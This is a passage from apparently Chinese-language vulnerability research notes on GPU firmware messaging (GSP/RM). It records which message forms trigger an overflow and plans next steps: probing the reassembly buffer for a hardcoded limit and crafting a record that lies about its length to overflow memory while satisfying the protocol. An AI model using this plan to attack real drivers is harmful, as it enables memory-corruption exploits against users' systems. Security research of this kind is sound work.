  内联多元素 → 溢出✓ 协议✗
  续传记录   → 协议✓ 溢出✗
```

## 17.3 下一步(精确)
```
A. 研究GSP续传重组的内存布局:
   重组缓冲区在哪? 大小怎么决定? 有没有固定上限?
   → 如果有上限(如128KB硬编码!), 超过=溢出!
   
B. 首记录长度谎+续传混合:
   首记录声明132KB(泵inline读33元素=溢出!)
   + 后续续传记录满足RM预期
   → 泵的copy和RM的续传同时被满足?
   
C. 回到C3-1方向(GSP→host)作为平行攻击面
```
